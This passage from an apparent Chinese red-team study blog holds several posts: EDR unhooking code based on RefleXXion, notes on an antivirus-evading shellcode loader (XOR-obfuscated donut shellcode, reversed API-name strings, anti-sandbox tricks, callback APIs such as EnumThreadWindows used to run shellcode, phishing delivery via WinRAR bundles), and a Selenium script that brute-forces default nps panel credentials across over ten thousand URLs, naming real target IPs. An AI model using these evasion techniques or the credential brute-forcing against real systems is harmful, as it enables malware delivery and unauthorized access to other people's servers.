TRUE;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-keyword">if</span> (InitSyscallsFromLdrpThunkSignature() == TRUE) &#123;<br><br><span class="hljs-comment">//Technique1();</span><br>Technique2();<br><span class="hljs-comment">//主要用到的还是第二种方法</span><br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>再查看dll的制作方法</p><p>注释了1方法1段的代码</p><p>添加了手动转换 方法一 和方法二</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FROM_DISK 0 <span class="hljs-comment">// If you set it to 1, the Technique-1 will be used. For more information; https://github.com/hlldz/RefleXXion</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FROM_KNOWNDLLS 1 <span class="hljs-comment">// If you set it to 1, the Technique-2 will be used. For more information; https://github.com/hlldz/RefleXXion</span></span><br><br></code></pre></td></tr></table></figure><p>和dllmain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;<br><br><span class="hljs-keyword">switch</span> (fdwReason) &#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>go();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//有后面这几个的话代表go()一定运行了</span><br><span class="hljs-keyword">return</span> TRUE;<br></code></pre></td></tr></table></figure><h2 id="EDR-Bypass-demo-6"><a href="#EDR-Bypass-demo-6" class="headerlink" title="EDR-Bypass-demo-6"></a>EDR-Bypass-demo-6</h2><p>借用了reflexxion的部分代码</p><p>c++代码，修改RefleXXion使其对user32.dll进行unhook。</p><p>没写RefleXXion的改法</p><h2 id="补充-现在unhook真的没用"><a href="#补充-现在unhook真的没用" class="headerlink" title="补充-现在unhook真的没用"></a>补充-现在unhook真的没用</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202210042238333.png" alt="image-20221004223813244"></p><p>我看的这些代码还是太过旧了？？？</p><p>大佬会话</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">这就是为啥我跟你说要多学蓝队开发的原因 国内天天说bypass 杀软/edr,问题是连IDA F5都没F5过 搞外挂的还会F5反作弊<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>红队  unhook</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vt全免杀加载器</title>
    <link href="/vt%E5%85%A8%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8.html"/>
    <url>/vt%E5%85%A8%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8.html</url>
    
    <content type="html"><![CDATA[<h2 id="加密器分析"><a href="#加密器分析" class="headerlink" title="加密器分析"></a>加密器分析</h2><p>先用donut将exe文件转换为raw.bin文件</p><p>然后用python脚本混淆+异或来进行加密生成shellcode-ptiti.txt</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>main中做了填充垃圾数据和</p><p>对抗沙箱的处理手段</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">如果没有<span class="hljs-keyword">shellcode的话也不会直接退出 </span>  <br></code></pre></td></tr></table></figure><p>run就是获取size 获取文件 申请内存为可读写  </p><p>callback执行内存</p><h2 id="编译注意事项"><a href="#编译注意事项" class="headerlink" title="编译注意事项"></a>编译注意事项</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209141845325.png"></p><h2 id="想法优点"><a href="#想法优点" class="headerlink" title="想法优点"></a>想法优点</h2><p>需要ico，基于机器学习的杀软会根据默认图标来直接判断为病毒，如果是知名的图标但没有对应签名也会报毒，最好自己制作图标</p><p>注意要x64位的，杀软对x64能力没有x32强，对应exe和shellcode也要是x64位</p><p>&#x2F;&#x2F;解决在其他目录调用exe可能会找不到文件的问题写了一套代码</p><p>申请内存为可读写，避免可读可写可执行的敏感内存属性</p><p>&#x2F;使用 GetProcAddress 来动态调用 api，隐藏导入表</p><p>xor解密逐个字节写入，防止一次性写入被发现敏感数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//如果文件不存在则做一道算术题，用来对抗沙盒，如果直接退出会被机器学习的杀软判断为病毒</span><br><span class="hljs-comment">//如用 GetTickCount 来判断开机时间的方式反沙盒会导致更多报毒</span><br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用的时候就是VThello和ptiti.txt要放在同一目录下 可能还需要加一些dll文件(原因在”编译注意事项”)里面有写</p><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><p>感觉就是分离加载器？</p><p>把受众不多的加载器弄上去  当然vt&#x3D;0了</p><p>&#x3D;&#x3D;并没有把shellcode包含在载荷中 不够便捷&#x3D;&#x3D;</p><p>&#x3D;&#x3D;当然这都是可以通过winrar修复的&#x3D;&#x3D;  </p><p>&#x3D;&#x3D;用来钓鱼的话就用winrar做成单文件&#x3D;&#x3D;</p><p>更有用的是可以用来权限维持和落地和装在webshell服务器这些</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//利用反转字符串防止出现敏感字符</span><br><span class="hljs-type">char</span> ppp[] = <span class="hljs-string">&quot;collAlautriV&quot;</span>;<br>strrev(ppp);<br><br>这就有个思考 如果反病毒程序在每次动态执行后做个静态检测是不是防病毒率更高 虽然代价也不低<br>    <br></code></pre></td></tr></table></figure><p>encrypt混淆异或加密有点慢  hackbrowserdat(7m)差不多需要加密两个小时 有没有什么改进代码方法把它加密快一点？</p><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209141952567.png" alt="image-20220914195239511"></p><p>这里指的callback是哪个？</p><p>线分析一下</p><p><em>(int</em>)(data)把data转成指向整型的指针值，只是一个类型转换，用来指示编译器后续的操作，最前面的*用来获取这个指针值指向的地址里存储的整型数，所以这个运算的结果返回的是int类型的值。</p><p>这也跟回调函数的概念差不多,用到了指针，地址。类型等概念</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-comment">(* (int *)</span> (addr)) <br></code></pre></td></tr></table></figure><p>就是将<code>addr</code>转换为指向int的指针</p><p>但是用例里面的是这个</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-comment">(*(int(*)</span>()) addr)();<br></code></pre></td></tr></table></figure><p>这个addr是在外面的</p><p>这里的意思可能就是(<em>(int(</em>)())形成回调函数去回调执行前面的addr函数</p><p>至于后面的();就是样式形式而已<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151509501.png" alt="image-20220915150921407"></p><p>那我们改一下吧</p><p>为了避免直接调用syscall,我们可以通过利用这种较为冷门的API函数来执行内存中的shellcode同样可以避开杀软的监控,通过callback方式来触发执行shellcode的方式可以参考:</p><p><strong><a href="https://www.freebuf.com/articles/web/269158.html">https://www.freebuf.com/articles/web/269158.html</a></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>EnumTimeFormatsA<br><span class="hljs-number">2.</span>EnumWindows<br><span class="hljs-number">3.</span>EnumDesktopWindows<br><span class="hljs-number">4.</span>EnumDateFormatsA<br><span class="hljs-number">5.</span>EnumChildWindows<br><span class="hljs-number">6.</span>EnumThreadWindows<br><span class="hljs-number">7.</span>EnumSystemLocales<br><span class="hljs-number">8.</span>EnumSystemGeoID<br><span class="hljs-number">9.</span>EnumSystemLanguageGroupsA<br><span class="hljs-number">10.</span>EnumUILanguagesA<br><span class="hljs-number">11.</span>EnumSystemCodePagesA<br><span class="hljs-number">12.</span>EnumDesktopsW<br><span class="hljs-number">13.</span>EnumSystemCodePagesW<br></code></pre></td></tr></table></figure><p>但是要注意：不是直接替换函数需要对照函数的参数来修改，需要参考库函数的格式。</p><p><code>https://www.xuebawang.net/t/1301</code>&#x3D;&#x3D;很适合以后看着学怎么找此类回调函数api&#x3D;&#x3D;</p><p><code>https://github.com/trhacknon/Shellcode-Loader/</code>&#x3D;&#x3D;这个可以查函数结构，方便自己写免杀&#x3D;&#x3D;</p><h3 id="1-EnumSystemLocalesA-LOCALE-ENUMPROCA-addr-0"><a href="#1-EnumSystemLocalesA-LOCALE-ENUMPROCA-addr-0" class="headerlink" title="1.EnumSystemLocalesA((LOCALE_ENUMPROCA)addr, 0);"></a>1.EnumSystemLocalesA((LOCALE_ENUMPROCA)addr, 0);</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151649540.gif"></p><h3 id="2-有的时候会有参数类型不兼容的情况"><a href="#2-有的时候会有参数类型不兼容的情况" class="headerlink" title="2.有的时候会有参数类型不兼容的情况"></a>2.有的时候会有参数类型不兼容的情况</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151653586.png" alt="image-20220915165303540"></p><p>要么就尝试修改参数类型 要么就用别的函数</p><p>addr是LPVOID原因是上面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">LPVOID</span><span class="hljs-params">(WINAPI* VP)</span><span class="hljs-params">(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect)</span>;<br><span class="hljs-type">char</span> ttt[] = <span class="hljs-string">&quot;tcetorPlautriV&quot;</span>;<br>strrev(ttt);<br>VP pVP = (VP)GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), ttt);<br>pVP(addr, size, PAGE_EXECUTE_READWRITE, &amp;ad_opro);<br></code></pre></td></tr></table></figure><p>一层一层执行传送给它的</p><p><em>LPVOID</em>是一个没有类型的指针，也就是说你可以将<em>LPVOID</em>类型的变量赋值给任意类型的指针</p><h4 id="那么我们试试-x3D-x3D-强制类型转换-x3D-x3D"><a href="#那么我们试试-x3D-x3D-强制类型转换-x3D-x3D" class="headerlink" title="那么我们试试&#x3D;&#x3D;强制类型转换&#x3D;&#x3D;"></a>那么我们试试&#x3D;&#x3D;强制类型转换&#x3D;&#x3D;</h4><p>首先得找到&#x3D;&#x3D;LANGGROUPLOCALE_ENUMPROCA的形参&#x3D;&#x3D;是啥</p><h3 id="3-EnumSystemGeoID-GEOCLASS-NATION-0-GEO-ENUMPROC-addr"><a href="#3-EnumSystemGeoID-GEOCLASS-NATION-0-GEO-ENUMPROC-addr" class="headerlink" title="3.EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)addr);"></a>3.EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)addr);<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151709826.png" alt="image-20220915170941741" style="zoom:50%;" /></h3><p>直接去上面那个github链接看一下这个EnumSystemGeoID函数的用法</p><p>&#x3D;&#x3D;当然其实我们看结构体里面的lpLanguageGroupEnumProc就是我们回调填写的地方&#x3D;&#x3D;</p><p>然后直接写进去<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151710764.gif"></p><h3 id="4-再来一个-找到lpLanguageGroupEnumProc-根据github提示添加bool"><a href="#4-再来一个-找到lpLanguageGroupEnumProc-根据github提示添加bool" class="headerlink" title="4.再来一个 找到lpLanguageGroupEnumProc 根据github提示添加bool"></a>4.再来一个 找到lpLanguageGroupEnumProc 根据github提示添加bool</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151719937.png" alt="image-20220915171958861"></p><p>再去看msdn</p><p>和各类对应值直接写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">EnumSystemLanguageGroupsA(addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151723241.png" alt="image-20220915172344192"></p><p>好吧这里也是不兼容 其实就是他是bool的原因<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209151724420.png" alt="image-20220915172421369"></p><p>这里也写了</p><p>那不搞了 反正都会了</p><p>当然可以用以前我自己的那个mimikatz去掉特征然后用dount转换成shellcode再用这些方法</p><h3 id="补充找到这些回调函数使用方法"><a href="#补充找到这些回调函数使用方法" class="headerlink" title="补充找到这些回调函数使用方法"></a>补充找到这些回调函数使用方法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">EnumFonts(GetDC(<span class="hljs-number">0</span>), (LPCWSTR)<span class="hljs-number">0</span>, (FONTENUMPROC)(<span class="hljs-type">char</span> *)addr, <span class="hljs-number">0</span>);<br><br>EnumFontFamiliesEx(GetDC(<span class="hljs-number">0</span>), <span class="hljs-number">0</span>, (FONTENUMPROC)(<span class="hljs-type">char</span> *)addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>LineDDA(<span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, (LINEDDAPROC)(<span class="hljs-type">char</span> *)addr, <span class="hljs-number">0</span>);<br><br>EnumFontFamilies(GetDC(<span class="hljs-number">0</span>), (LPCWSTR)<span class="hljs-number">0</span>, (FONTENUMPROC)(<span class="hljs-type">char</span> *)addr,<span class="hljs-number">0</span>);<br><br>EnumDisplayMonitors((HDC)<span class="hljs-number">0</span>,(LPCRECT)<span class="hljs-number">0</span>,(MONITORENUMPROC)(<span class="hljs-type">char</span> *)addr,(LPARAM)<span class="hljs-number">0</span>);<br><br>GrayString(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (GRAYSTRINGPROC)(<span class="hljs-type">char</span> *)addr, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>);<br><br>CallWindowProc((WNDPROC)(<span class="hljs-type">char</span> *)addr, (HWND)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>EnumResourceTypes(<span class="hljs-number">0</span>, (ENUMRESTYPEPROC)(<span class="hljs-type">char</span> *)addr, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209152030829.gif"></p><p>全都是可以的</p><p>后面找到更好的 可以无创建新线程 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">EnumThreadWindows(<span class="hljs-number">0</span>, (WNDENUMPROC)addr, <span class="hljs-number">0</span>);<span class="hljs-comment">//好东西,当然上面也有</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>红队 shellloder</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nps默认账号密码爆破1w多个urls</title>
    <link href="/nps%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B41w%E5%A4%9A%E4%B8%AAurls.html"/>
    <url>/nps%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B41w%E5%A4%9A%E4%B8%AAurls.html</url>
    
    <content type="html"><![CDATA[<h2 id="selenuim去模拟用户访问url去进行爆破默认账号密码"><a href="#selenuim去模拟用户访问url去进行爆破默认账号密码" class="headerlink" title="selenuim去模拟用户访问url去进行爆破默认账号密码"></a>selenuim去模拟用户访问url去进行爆破默认账号密码</h2><p>因为每个url的session和cookie是不一样的 所以用以往的那种账号密码爆破脚本是不可能成功的</p><p>而且session也都是服务端发起的  伪造难度也巨大</p><p>那么就想着只能通过selenuim去模拟用户访问url去进行爆破默认账号密码</p><p>缺点是每次爆破前都得手动检查一下填充地址什么的</p><p>不过这也是没办法的办法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209241019536.png" alt="image-20220924101923467"></p><p>账号密码和登录按钮的各个前端源码都写了</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209241114025.png" alt="image-20220924111458973"></p><h2 id="接下来就是看下回弹检测机制"><a href="#接下来就是看下回弹检测机制" class="headerlink" title="接下来就是看下回弹检测机制"></a>接下来就是看下回弹检测机制</h2><p>两种方法判断</p><p>1.<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209241116646.png" alt="image-20220924111647598"></p><p>找到这段弹窗的js代码</p><p>2.bp或者fiddle获取response包判断    2的话res包因为js session格式的原因做不到这种方法</p><h3 id="先来1"><a href="#先来1" class="headerlink" title="先来1"></a>先来1</h3><p>由于这个框是在 发送后服务端校验后再通过前端 alert(res.msg)返回弹出的</p><p>难找出弹窗规则</p><p><strong>先利用方法switch_to_alert()定位到alert等弹出框，再进行相应的处理(确认、取消、输入值)</strong></p><p>还是用xpath定位好用一点</p><p>&#x2F;&#x2F;*[@placeholder&#x3D;”密码”]<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209241834857.png" alt="image-20220924183422781"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//*[text()=&quot;xxx&quot;]                         文本内容是xxx的元素</span><br><span class="hljs-comment">//*[contains(@attribute,&#x27;value&#x27;)]         属性值包含value的字符串</span><br><span class="hljs-comment">//*[starts-with(@attribute,&#x27;value&#x27;)]      属性以value开头的字符串</span><br>find_element_by_xpath(<span class="hljs-string">&quot;//p[contains(text(),‘京公网’)]&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>因为用中文可能机器语言检索不到 所以用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>*[@name=<span class="hljs-string">&#x27;username&#x27;</span>]<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209241954333.png" alt="image-20220924195403272"></p><p>原来一开始检索都是对的 就是没有这个send_keys  看下怎么突破<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209242051412.png" alt="image-20220924205117311"></p><p>通过print发现根本就没拿到</p><p>尝试写入tab试试</p><p>要想写入tab的话还是得先写find_element  真的难受 不过我就知道我要写很久 我无所谓</p><p>不行 那就还是查查dict怎么就不行了<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209242147556.png" alt="image-20220924214748492"></p><p>最后通过该selenuim版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip3</span> install selenium==<span class="hljs-number">3</span>.<span class="hljs-number">141</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>解决问题</p><p><button onclick="login()" class="btn btn-primary block full-width m-b" langtag="word-login">登录</button></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-meta"># print(url)</span><br>   #**先利用方法switch_to_alert()定位到alert等弹出框，再进行相应的处理(确认、取消、输入值)**<br>    time.sleep(<span class="hljs-number">0.1</span>) #等待结果<br>    <span class="hljs-meta"># alter = bo.switch_to.alert</span><br>    <span class="hljs-meta"># alter.text</span><br>    <br>    <br>    #判断是否有弹窗<br>    result = EC.alert_is_present()(bo)<br>    <span class="hljs-keyword">if</span> result:<br>        print(<span class="hljs-string">&quot;%s无洞&quot;</span> %url)<br>        result.accept()<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;%s有洞&quot;</span> %url)<br>    <br>bo.close()    <br></code></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>后面发现使用</p><p>seleniumwire可以获取headtoken这些东西<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209242209079.png" alt="image-20220924220909952"></p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209242235459.png" alt="image-20220924223515350"></p><p>在多个站点的时候要对不同的网站的报错做异常处理</p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209250947067.png" alt="image-20220925094748980" style="zoom: 50%;" /><p>访问发现是404超时了</p><p>我们的代码里做了implicitly_wait(10)隐式等待</p><p>隐式等待是在尝试发现某个元素的时候，如果没能立刻发现，就等待固定长度的时间。默认设置是0秒。一旦设置了隐式等待时间，它的作用范围就是Webdriver对象实例的&#x3D;&#x3D;整个生命周期&#x3D;&#x3D;。</p><p>所以代码默认做了十秒周期的探寻 如果超时了就traceback </p><p>所以我们得做个异常超时捕获处理<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251107533.png" alt="image-20220925110728480"></p><p>加了捕获超时异常来跳出循环<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251108449.png" alt="image-20220925110805367"></p><p>但是执行一会后又报错了</p><p><a href="http://1.116.130.188:6666/login/index%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%E6%89%BE%E4%B8%8D%E5%88%B0username![image-20220925111243399](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251112459.png)">http://1.116.130.188:6666/login/index这个网址找不到username![image-20220925111243399](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251112459.png)</a></p><p>访问发现也是404  不过是直接的404 很快的那种 而且ping也能ping通<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251120649.png" alt="image-20220925112006599"></p><p>在xpath处又加了异常处理</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251121061.png" alt="image-20220925112126003"></p><p>访问<a href="http://1.116.143.14:8080/login/index%E6%97%B6%E5%8F%91%E7%8E%B0%E7%AC%AC65%E8%A1%8Cbo.close()">http://1.116.143.14:8080/login/index时发现第65行bo.close()</a>   报错 而且提示了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Message: unexpected alert <span class="hljs-keyword">open</span>: &#123;Alert <span class="hljs-type">text</span> : username <span class="hljs-keyword">or</span> <span class="hljs-keyword">password</span> incorrect&#125;<br></code></pre></td></tr></table></figure><p>把前面那些成功的都删了再跑一下看一下是不是没有守护进程的问题<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251125746.png" alt="image-20220925112525691"></p><p>删了发现还真过了</p><p>但是不知道是什么原因</p><p>而且经常会无回显需要手动”回车”才能执行下一个步骤</p><p>感觉是各种wait sleep限制加太多了 待会全关掉试试 只需要隐式等待10s就好了</p><p>好家伙 直接来个很稳定的报错<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251132262.png" alt="image-20220925113251179"></p><p>也是bo.close 那先解决这个吧</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251136357.png" alt="image-20220925113611301"></p><p>感觉是因为弹窗问题 我对弹窗的关闭函数没有执行</p><p>网上原因</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">JavaScript是单线程，而alert属于同步方法，<br>JS引擎主线程的第一优先级就是执行同步代码，一旦它占住了主线程其他的代码就得靠边，强行执行肯定抛异常~<br></code></pre></td></tr></table></figure><p>再分析一下 我们的错是在bo.close 而它是不属于for循环的 也就是说 for循环已经结束了</p><p>那它是怎么结束的呢？</p><p>只有一个异常回显 就是这个alert 所以感觉这个alert有很大成分 </p><p>还有就是 为什么加了wait后 这个异常的概率就变小了呢？</p><p>我知道了 是因为我把这些删掉后  就剩个隐式计时10s 然后我们没有正确处理alert弹窗  某一段时间内(可能是本体alert关不掉导致超时，也可能是下次循环访问url超时)它关不掉的话 就会超出</p><p>我感觉“本体”的可能性更大一点</p><p>所以先正确处理alert<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251320019.png" alt="image-20220925132042979"></p><p>我一直以为是这个没运行</p><p>没想到只是vscode没显示出来 其实还是有运行的  删掉的话更出问题<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209251325753.png" alt="image-20220925132543683" style="zoom:50%;" /></p><p>吃惊 改回原样居然就好了</p><p>后面又有个异常</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261619347.png" alt="image-20220926161914809"></p><p>在这里卡了一个多小时</p><p>守护进程还有超时continue ？（经常超时没有回显）</p><p>后面访问该网页还是可以访问的  说明不是超时的问题</p><p>难道是需要守护进程？ 先看看网上的做法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261817965.png" alt="image-20220926181745901"></p><p>奇怪 又跑了一次 发现这里会timeout 且  每次报错的行都不一样</p><p>之前都是alert弹窗没有关闭报错 这次是timeout报错</p><p>这里应该是长时间定位不到alert 然后超时报错</p><p>真麻烦 我全都给他们加上异常处理试试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261827994.png" alt="image-20220926182721906"></p><p>自从我全加了异常处理之后 运行了好几次 都没回显</p><p>我怀疑是一直continue导致一直遍历下去且没有回显   赶紧改回去</p><p>可能是加载内容过多，导致的超时。</p><p>先把</p><p><code>chrome_options.add_argument(&#39;--headless&#39;)</code>（该‘浏览器不提供可视化页面’设置去掉）</p><p>动态看一下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261838327.png" alt="image-20220926183801238"></p><p>也可以<strong>添加不加载图片设置，提升速度</strong>：<code>chrome_options.add_argument(&#39;blink-settings=imagesEnabled=false&#39;)</code></p><p>但是我觉得没能直观改变 写看下浏览器动态吧</p><p>出现报错了</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261847887.png" alt="image-20220926184744799"></p><p>后面手动去给它back 又可以继续自动化了 <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261851208.png" alt="image-20220926185137123"></p><p>:dagger:没过一会 又不搞了<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261855827.png" alt="image-20220926185527724"></p><p>给他刷新一下  &#x3D;&#x3D;然后他们自动跳转到新的url 并且这次的url不会记录&#x3D;&#x3D;    